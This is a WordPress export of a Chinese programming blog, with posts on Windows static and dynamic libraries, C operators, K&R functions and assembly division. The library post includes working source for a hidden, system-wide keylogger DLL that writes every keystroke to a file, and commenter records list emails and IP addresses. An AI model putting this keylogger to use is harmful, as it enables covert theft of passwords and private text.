		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1309709760]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[13]]></wp:meta_value>
		</wp:postmeta>
								<wp:comment>
		<wp:comment_id>4</wp:comment_id>
		<wp:comment_author><![CDATA[我不是懒洋洋]]></wp:comment_author>
		<wp:comment_author_email>734134138@qq.com</wp:comment_author_email>
		<wp:comment_author_url>http://yangyangjiji.blogcn.com</wp:comment_author_url>
		<wp:comment_author_IP>220.189.218.6</wp:comment_author_IP>
		<wp:comment_date>2011-07-13 15:52:07</wp:comment_date>
		<wp:comment_date_gmt>2011-07-13 07:52:07</wp:comment_date_gmt>
		<wp:comment_content><![CDATA[起初以为是影评~~~]]></wp:comment_content>
		<wp:comment_approved>1</wp:comment_approved>
		<wp:comment_type></wp:comment_type>
		<wp:comment_parent>0</wp:comment_parent>
		<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
				<wp:comment>
		<wp:comment_id>5</wp:comment_id>
		<wp:comment_author><![CDATA[codemylife]]></wp:comment_author>
		<wp:comment_author_email>houapple@163.com</wp:comment_author_email>
		<wp:comment_author_url>http://codemylife.blogcn.com</wp:comment_author_url>
		<wp:comment_author_IP>210.13.74.220</wp:comment_author_IP>
		<wp:comment_date>2011-07-16 10:06:33</wp:comment_date>
		<wp:comment_date_gmt>2011-07-16 02:06:33</wp:comment_date_gmt>
		<wp:comment_content><![CDATA[<a href="#comment-4" rel="nofollow">@我不是懒洋洋 </a> 
个人看了之后的感受而已，影评当然不敢当了。其实，对于十一度青春系列而言，大众的感受，也就是短片想要表达的主题，字幕已经概括的相当的不错了，剩下的是每个人心中的各自不同的体会而已。]]></wp:comment_content>
		<wp:comment_approved>1</wp:comment_approved>
		<wp:comment_type></wp:comment_type>
		<wp:comment_parent>0</wp:comment_parent>
		<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
			</item>
		<item>
		<title>创建和使用静态库或动态库</title>
		<link>http://codemylife.blogcn.com/2011/07/%e5%88%9b%e5%bb%ba%e5%92%8c%e4%bd%bf%e7%94%a8%e9%9d%99%e6%80%81%e5%ba%93%e6%88%96%e5%8a%a8%e6%80%81%e5%ba%93/</link>
		<pubDate>Tue, 05 Jul 2011 03:59:42 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[Windows]]></category>

		<category domain="category" nicename="windows"><![CDATA[Windows]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=57</guid>
		<description></description>
		<content:encoded><![CDATA[近来养成了一个习惯，当我想在网上查询一些不懂的知识点时，打开网页A。而在浏览网页A的时候我或许会打开网页B，因为网页A中的一些知识点我也不懂:)，或许网页B里面的知识和我查的东西早已风马牛不相及了。如果是我觉得有用的知识点时，我就会看下去。这样，很可能一下子就打开了很多个页面，而一下子又不能消化完，于是全存成chrome书签。

当书签越来越多的时候，我就开始要求自己去解决遗留下来的问题了。去理解知识点，或许会在博客上留下笔记，于是本文就是为了解决静态库和动态库这两个遗留问题而写的。:)

之前做过一个keyboard hook，用到了dll，查阅了一些动态库的知识，这里指的静态库和动态库仅限于Windows下。

关于直接用VC以创建项目类型的方式来创建和使用静态库或动态库 ，MSDN上的两篇文章已经讲得很详细了：
<a href="http://msdn.microsoft.com/zh-cn/library/ms235627(v=vs.90).aspx">创建和使用静态库 (C++)</a>
<a href="http://msdn.microsoft.com/zh-cn/library/ms235636(v=vs.90).aspx">创建和使用动态链接库 (C++)</a>

这里主要以一个例子来讲创建和使用静态库和动态库的命令行用法。
首先是静态库
如下有3个文件，分别为exam.h，exam.c，main.c
<pre class="c">
//exam.h
int add(int a, int b);
</pre>
<pre class="c">
//exam.c
#include "exam.h"
int add(int a, int b)
{
    return a + b;
}
</pre>
<pre class="c">
//main.c
#include "exam.h"
#include <stdio.h>
</br>
int main()
{
    int sum = add(1, 2);
    printf("%d", sum);
    return 0;
}
</pre>
我们以如下命令编译exam.c和main.c，会在当前目录生成exam.obj和main.obj。
cl /c exam.c
cl /c main.c
我们用lib.exe对exam.obj进行打包，使之生成静态库exam.lib。
lib exam.obj
最后直接用link.exe链接生成exe文件。
link main.obj exam.lib

当我们想以静态库的形式而不是以源码的形式提供给别人使用你的功能时，提供exam.h和exam.lib给对方就行了。当删掉exam.lib时，main.exe仍能运行，这是因为main.exe已经包含exam.lib的内容了，这也是称为静态库的原因。

然后是动态库
因为动态库有两种链接方式：隐式链接和显式链接，这两种不同的链接方式导致了代码写的也不一样。MSDN上关于这方面的文章如下:
<a href="http://msdn.microsoft.com/zh-cn/library/253b8k2c(v=vs.90).aspx">确定要使用的链接方法</a>
<a href="http://msdn.microsoft.com/zh-cn/library/2kzt1wy3(v=vs.90).aspx">/MD、/MT、/LD（使用运行时库）</a>
这里我们按照隐式链接的做法来编写代码
<pre class="c">
//exam.h
__declspec(dllexport) int add(int a, int b);
</pre>
<pre class="c">
//exam.c
#include "exam.h"
</br>
__declspec(dllexport) int add(int a, int b)
{
    return a + b;
}
</pre>
main.c代码不变，我们用如下命令分别编译exam.c和main.c
cl /LD exam.c
cl /c main.c
生成文件如下：
main.obj
exam.obj
exam.dll
exam.lib
exam.exp

这里exam.lib和exam.dll是我们需要的，用如下命令生成exe:
link main.obj exam.lib

链接的时候没有提供exam.dll，这也是被称作动态库的原因，程序会在运行过程中动态加载。这里如果删掉exam.dll，运行main.exe会报错，提示无法找到exam.dll。

同样如果你以动态库的形式而不是以源码的形式提供给别人使用我们的功能时，将exam.h，exam.lib，exam.dll提供给对方就行了。DX库就是以这样的方式提供给我们使用的，我们包含d3d9.h， 使用库d3d9.lib。MS将dll文件放在哪儿了呢？打开C:\WINDOWS\system32目录，你会发现一堆的dll，里面就包含了我们要用的d3d9.dll。

动态库和静态库的用法到此结束了，下面贴下自己写的keyboard hook的dll代码，用途你懂的:)
<pre class="c">
//keyboardhook.h
#ifndef _KEYBOARD_HOOK_H
#define _KEYBOARD_HOOK_H
</br>
#ifdef __cplusplus
#define _KEYBOARDHOOK_API extern "C" __declspec(dllexport)
#else
#define _KEYBOARDHOOK_API __declspec(dllexport)
#endif
</br>
_KEYBOARDHOOK_API BOOL CALLBACK KeyboardHook();
_KEYBOARDHOOK_API BOOL CALLBACK KeyboardUnHook();
</br>
#endif
</pre>
<pre class="c">
//keyboardhook.c
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include "keyboardhook.h"
</br>
#pragma data_seg("shared")
HHOOK hKeyboardHook = NULL;
char szLow[] = {'1','2','3','4','5','6','7','8','9','0'};
char szTop[] = {'!','@','#','$','%','^','&','*','(',')'};
#pragma data_seg()
</br>
#pragma comment(linker, "/SECTION:shared,RWS")
</br>
HINSTANCE   hinst = NULL;
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
	hinst = (HINSTANCE)hinstDLL;
	break;
    case DLL_PROCESS_DETACH:
	break;
    }
    return TRUE;
}
</br>
LRESULT CALLBACK KeyboardHookProc(int ncode,WPARAM wParam, LPARAM lParam)
{
    if (ncode == HC_ACTION && (DWORD)(lParam & 0x40000000)) {
	FILE* file;
	char ch;
	int i;
	ch = (char)wParam;
	file = fopen("e:\\keynote.txt", "a+");
</br>
	if (wParam == VK_RETURN) {
	    ch = '\n';
	    fwrite(&ch, 1, 1, file);
	    fclose(file);
	}
	else if ((wParam == VK_SPACE) || (wParam &gt;= 0x2f && wParam &lt;= 0x100 ))
        {
	    BYTE keyState[256] = {0};
	    UINT scanCode = 0;
	    WORD c;
	    ToAscii(wParam, scanCode, keyState, &c, 0);
	    ch = (char)c;
</br>
	    //convert digit
	    for (i = 0; i &lt; sizeof(szLow); i++) {
		if (ch == szLow[i] && GetKeyState(VK_SHIFT) &lt; 0) {
		    ch = szTop[i];
		        break;
		}
	    }
</br>
	    //convert character
	    if (ch &gt;= 'a' && ch &lt;= 'z' && GetKeyState(VK_SHIFT) &lt; 0) {
		if (GetKeyState(VK_CAPITAL) &lt; 0)
		    ;
		else
		    ch -= 'a' - 'A';
	    }
</br>
	    fwrite(&ch, 1, 1, file);
	    fclose(file);
        }
    }
    return CallNextHookEx(hKeyboardHook, ncode, wParam, lParam);
}
</br>
_KEYBOARDHOOK_API BOOL CALLBACK KeyboardHook()
{
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardHookProc, hinst, 0);
    if (hKeyboardHook == NULL)
	return FALSE;
    else
	return TRUE;
}
</br>
_KEYBOARDHOOK_API BOOL CALLBACK KeyboardUnHook()
{
    BOOL bUnHook = UnhookWindowsHookEx(hKeyboardHook);
    return bUnHook;
}
</pre>
在对话框中添加相应按钮消息
<pre class="c">
void CkeymsgDlg::OnBnClickedStartbtn()
{
    // TODO: 在此添加控件通知处理程序代码
    m_start = !m_start;
    if (m_start) {
        KeyboardHook();
	m_BtnText = "停止";
    }
    else {
	KeyboardUnHook();
	m_BtnText = "启动";
    }
    UpdateData(FALSE);
    ShowWindow(SW_HIDE);
}
</pre>
OVER~~~

相关的文章：
<a href="http://msdn.microsoft.com/zh-cn/library/1ez7dh12(v=vs.90).aspx">DLL</a>
<a href="http://www.blogjava.net/wxb_nudt/archive/2007/09/11/144371.html">DLL编写教程</a>
<a href="http://hi.baidu.com/hinus/blog/item/bd154081801101dbbc3e1eac.html">CL & LINK的命令行用法</a>
<a href="http://archive.cnblogs.com/a/1991317/">浅谈HOOK</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>57</wp:post_id>
		<wp:post_date>2011-07-05 11:59:42</wp:post_date>
		<wp:post_date_gmt>2011-07-05 03:59:42</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%88%9b%e5%bb%ba%e5%92%8c%e4%bd%bf%e7%94%a8%e9%9d%99%e6%80%81%e5%ba%93%e6%88%96%e5%8a%a8%e6%80%81%e5%ba%93</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1310975234]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[16]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>C转义字符和运算符优先级</title>
		<link>http://codemylife.blogcn.com/2011/07/c%e8%bd%ac%e4%b9%89%e5%ad%97%e7%ac%a6%e5%92%8c%e8%bf%90%e7%ae%97%e7%ac%a6%e4%bc%98%e5%85%88%e7%ba%a7/</link>
		<pubDate>Tue, 12 Jul 2011 15:14:13 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[C]]></category>

		<category domain="tag" nicename="c"><![CDATA[C]]></category>

		<category><![CDATA[C/C++]]></category>

		<category domain="category" nicename="cc"><![CDATA[C/C++]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=62</guid>
		<description></description>
		<content:encoded><![CDATA[关于c语言的基础知识，《The C Programming Language》上的内容，记录下来。

<strong>常量</strong>
一个字符常量是一个整数，书写时将一个字符括在单引号中，如‘x’。字符在机器字符集中的数值就是字符常量的值。例如，在ASCII字符集中，字符'0'的值是48，它与数值0没有关系。

ASCII C语言中的全部转义字符序列如下：
\a        响铃符                \\     反斜杠
\b        回退符                \?     问号
\f         换页符                \'       单引号
\n        换行符                \"       双引号
\r         回车符                \000 八进制数
\t         横向制表符          \xhh 十六进制数
\v        纵向制表符

字符常量'\0'表示值为0的字符，也就是空字符null。我们通常用'\0'的形式代替0，以强调某些表达式的字符属性，但其数字值为0。

常量表达式是仅仅只包含常量的表达式。这种表达式在编译时求值，而不在运行时求值。它可以出现在常量可以出现的任何位置。

字符串常量也叫字符串字面值，是用双引号括起来的0个或多个字符组成的字符序列。双引号不是字符串的一部分，它只用于限定字符串。编译时可将多个字符串常量连接起来。

例如："hello," " world"等价于"hello, word"。

从技术角度讲，字符串常量就是字符数组。字符串的内部表示使用一个空字符'\0'作为串的结尾，因为存储字符串的物理存储单元数比括在双引号中的字符数多一个。这种表示方法也说明，C语言对字符串的长度没有限制，但程序必须扫描完整个字符串才能确定字符串的长度。标准函数strlen(s)可以返回字符串参数s的长度，但长度不包括末尾的'\0'。

<strong>运算符的优先级和求值次序</strong>
从上至下优先级逐渐降低
除了红色字体的运算符结合性为从右至左外，其余均为从左至右。
()  []  -&gt;  .
<span style="color: #ff0000;"> !  ~  ++  --  +  -  *  &amp;   (type)   sizeof</span>
*  /  %
+  -
&lt;&lt;  &gt;&gt;
&lt;  &lt;=  &gt;  &gt;=
==  !=
&amp;
^
|
&amp;&amp;
||
<span style="color: #ff0000;">?:</span>
<span style="color: #ff0000;"> =  +=  -=  *=  /=  %=  &amp;= </span>
^=  |=  &lt;&lt;=  &gt;&gt;=
,
注：一元运算符+、-、&amp;与*比相应的二元运算符+、-、&amp;与*的优先级高。

注意，位运算符&amp;、^与|的优先级比运算符== 与|=的低，这意味着，位测试表达式，如
if ((x &amp; mask) == 0)

C语言没有指定同一运算符中多个操作数的计算顺序（&amp;&amp;、||、?:、和,运算符除外）。同样C语言也没指定函数个参数的求值顺序。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>62</wp:post_id>
		<wp:post_date>2011-07-12 23:14:13</wp:post_date>
		<wp:post_date_gmt>2011-07-12 15:14:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>c%e8%bd%ac%e4%b9%89%e5%ad%97%e7%ac%a6%e5%92%8c%e8%bf%90%e7%ae%97%e7%ac%a6%e4%bc%98%e5%85%88%e7%ba%a7</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359148]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[14]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>《C程序设计语言》中的程序小诗</title>
		<link>http://codemylife.blogcn.com/2011/07/%e3%80%8athe-c-programming-language%e3%80%8b%e4%b8%ad%e7%9a%84%e7%a8%8b%e5%ba%8f%e5%b0%8f%e8%af%97/</link>
		<pubDate>Sat, 16 Jul 2011 02:57:40 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[C]]></category>

		<category domain="tag" nicename="c"><![CDATA[C]]></category>

		<category><![CDATA[C程序设计语言]]></category>

		<category domain="category" nicename="c%e7%a8%8b%e5%ba%8f%e8%ae%be%e8%ae%a1%e8%af%ad%e8%a8%80"><![CDATA[C程序设计语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=63</guid>
		<description></description>
		<content:encoded><![CDATA[260页的本书却是学习C语言的经典。

回顾自己的编程语言学习过程，从谭浩强的C语言教科书到学C++时自己买的《C++ Primer》，后来再读此书，每个阶段给我的感受不尽相同。初学C面对符号时的晦涩，然后学C++时大量学学习类，成员函数，标准库string，vector……以至于当买了并将侯捷的《STL源码剖析》捧在手中，当时的激动心情，可以用不久前看过的一句话来形容：开着高达背着6把狂战斧带着3000城管去拯救世界。

当时很不轻松的将源码剖析看了一遍，有些语言上的trick依然没十分明白。后来学习本书，方才找到了编程上的踏实之感！好像记得以前看《UNIX编程艺术》上摘录过的话：“C语言就是观察字符，然后啥也不干”。诙谐的语言，却道出了一些本质，对于早期的计算机，没有图形界面，大部分都是用户在终端上敲入一串命令，然后执行而已。写程序也就如此单纯，读入字符，计算，显示字符。

以下程序摘录自《The C Programming Language》。简短，清爽的代码犹如一首怡人的小诗，估计是那些惯用C++类，标准库的人不能体会的吧，他们会默念vector，string，map，find，erase……

getline函数：将一行读入s中并返回其长度
<pre class="c">
int getline(char s[], int lim)
{
    int c, i;
        for (i = 0; i < lim - 1 && (c = getchar()) != EOF && c != '\n'; ++i)</br>
        s[i] = c;
</br>
    if (c == '\n') {
        s[i] = c;
        ++i;
    }
    s[i] = '\0';
    return i;
}
</pre>
strlen函数：返回s的长度
<pre class="c">
int strlen(char s[])
{
    int i;
</br>
    i = 0;
    while (s[i] != '\0')
        ++i;
    return i;
}
</pre>
squeeze函数：从字符串s中删除字符c
ps：这个小函数小且优雅，一般思路是找到字符c并将c后面的字符全部前移一位，于是2重循环。C++做法：string，erase
<pre class="c">
void squeeze(char s[], int c)
{
    int i, j;
</br>
    for (i = j = 0; s[i] != '\0'; i++)
        if (s[i] != c)
            s[j++] = s[i];
    s[j] = '\0';
}
</pre>
strcat函数：将字符串t连接到字符串s的尾部，s必须有足够大的空间
ps：此函数和众多C字符串函数一样有缓冲区溢出的风险
<pre class="c">
void strcat(char s[], char t[])
{
    int i, j;
</br>
    i = j = 0;
    while (s[i] != '\0')
        i++;
    while ((s[i++] = t[j++]) != '\0')
        ;
}
</pre>






]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>63</wp:post_id>
		<wp:post_date>2011-07-16 10:57:40</wp:post_date>
		<wp:post_date_gmt>2011-07-16 02:57:40</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e3%80%8athe-c-programming-language%e3%80%8b%e4%b8%ad%e7%9a%84%e7%a8%8b%e5%ba%8f%e5%b0%8f%e8%af%97</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359138]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[9]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>divdw</title>
		<link>http://codemylife.blogcn.com/2011/08/%e4%b8%8d%e4%bc%9a%e4%ba%a7%e7%94%9f%e6%ba%a2%e5%87%ba%e7%9a%84%e9%99%a4%e6%b3%95/divdw/</link>
		<pubDate>Wed, 03 Aug 2011 02:33:27 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp03/M00/01/B9/wKgKCk44s3cAAAAAAAAUmgVFdZA044.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>71</wp:post_id>
		<wp:post_date>2011-08-03 10:33:27</wp:post_date>
		<wp:post_date_gmt>2011-08-03 02:33:27</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>divdw</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>70</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp03/M00/01/B9/wKgKCk44s3cAAAAAAAAUmgVFdZA044.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"473";s:6:"height";s:3:"207";s:14:"hwstring_small";s:23:"height='56' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/01/7F/wKgKDU44s3cAAAAAAAATWRTUBfo974.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:2:"82";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/01/B5/wKgKCk44s3cAAAAAAAAjNlpVvnA301.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/01/7C/wKgKC044s3cAAAAAAAAUmmS-kJ4890.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>不会产生溢出的除法</title>
		<link>http://codemylife.blogcn.com/2011/08/%e4%b8%8d%e4%bc%9a%e4%ba%a7%e7%94%9f%e6%ba%a2%e5%87%ba%e7%9a%84%e9%99%a4%e6%b3%95/</link>
		<pubDate>Wed, 03 Aug 2011 02:48:57 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=70</guid>
		<description></description>
		<content:encoded><![CDATA[最近觉得自己的基础知识很是不扎实，刚好看到csapp第二版上市了，果断买了回来精读。之前曾在老大那里借了csapp第一版，看到程序的机器表示那里卡住了，于是这次也买了本书学习汇编。汇编语言的书很多，但称得上好书的当然是王爽的《汇编语言》了。

书读了一半了，在试验中碰到了写一个子程序，功能时进行不会产生溢出的除法运算，被除数是dword行，除数是word型，结果为dword型。

对于计算X / N(x &lt; 65536 * 65536, N != 0)，书中给出了公式并证明可以做如下分解：
<strong> X / N = int(H / N) * 65536 + [rem(H / N)*65536 + L] / N</strong>

原理是将一次除法分成二次除法，两次除法过程中商小于65536，即能用寄存器存放的值，就确保了不会溢出，具体证明过程见书附注。

这里给出汇编代码：
<pre>;name: divdw
;fuction: division with not overflow, divisor: word, dividend: dword
;param: (ax) = dword low 16 bits
;       (dx) = dword high 16 bits
;       (cx) = divisor
;ret:   (dx) = result high 16 bits
;       (ax) = result low 16 bits
;       (cx) = remainder
assume cs:code
</br>
code segment
start:
    mov ax, 4240h
    mov dx, 000fh
    mov cx, 0a0h
    call divdw
</br>
    mov ax, 4c00h
    int 21h
divdw:
    push bx
    push ax
</br>
    mov ax, dx
    xor dx, dx
    div cx
</br>
    mov bx, ax
    pop ax
    div cx
</br>
    mov cx, dx
    mov dx, bx
</br>
    pop bx
    ret
code ends</pre>
以上可以用如下图形象的表示：
<img src="http://files.blogcn.com/wp03/M00/01/B9/wKgKCk44s3cAAAAAAAAUmgVFdZA044.png" alt="divdw" />
另举一个十进制的例子，假设我们需要计算321 / 2，但我们的寄存器为8位，只支持最大数255，且我们系统只支持8位的除法，那么按照公式我们可以做如下分解：
321 / 2 = int (3 / 2)  * 100 + [rem(3 / 2) * 100 + 21] / 2
= 1 * 100 + 121 / 2
= 160
从而实现了将一次除法变成两次不会溢出的除法。注意<strong>除法溢出</strong>是指用div做除法运算时，结果的商过大，超出了寄存器所能存储的范围，至于余数，肯定是被舍弃了。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>70</wp:post_id>
		<wp:post_date>2011-08-03 10:48:57</wp:post_date>
		<wp:post_date_gmt>2011-08-03 02:48:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e4%b8%8d%e4%bc%9a%e4%ba%a7%e7%94%9f%e6%ba%a2%e5%87%ba%e7%9a%84%e9%99%a4%e6%b3%95</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1343359095]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
